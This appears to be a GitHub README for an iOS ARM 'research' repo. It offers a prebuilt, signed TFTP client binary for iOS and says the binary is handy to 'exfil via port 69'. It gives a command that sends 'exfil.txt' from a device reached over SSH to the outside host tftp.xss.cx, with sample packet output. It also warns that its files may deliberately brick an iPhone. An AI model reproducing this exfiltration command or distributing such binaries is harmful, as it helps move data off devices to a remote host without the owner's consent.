# ios-arm-research
iOS, ARM, Research

Note to those coming to this Repo in a Blind manner.. you really don't want to be downloading anything here, it'll probably brick you iphone, on purpose.
To those who land here Blind, be so careful what you download from the Internet.. these files are for troubleshoot technical support issue and have a very specific context.

To the people that I sent here, you're in the right place. Keep going.. this is th right place to be... :-)

Updated Jan 25 2021

The file named 'client' is a Binary ARM file for TFTP Command Line on iOS and its signed with my Developer ID for convenience for iOS Research

usage: ./client [-p port] [-h hostname] -f filename

Reminder: Its a TFTP CLI Executable, so you need a TFTP Server and a few other things to make it all work..

Comment: the compiled file may be really helpful since you may want to exfil via port 69.

The files in this Repo.. starting point for why you came.. refer back to that Post for the Makefile mods ... the Makefile here is for Intel Platform.. so you need to read that Post on cross compilation for client .... OR just copy the client binary..its iOS ready to run. 


Putting it all together.. 
you'll be ssh into /dev/thingy

./client -h tftp.xss.cx -p 69 -f exfil.txt

...
...
Packet '143966' sent
Packet '143967' sent
Packet '143968' sent
Packet '143969' sent
FIN '143970' sent
Goodbye




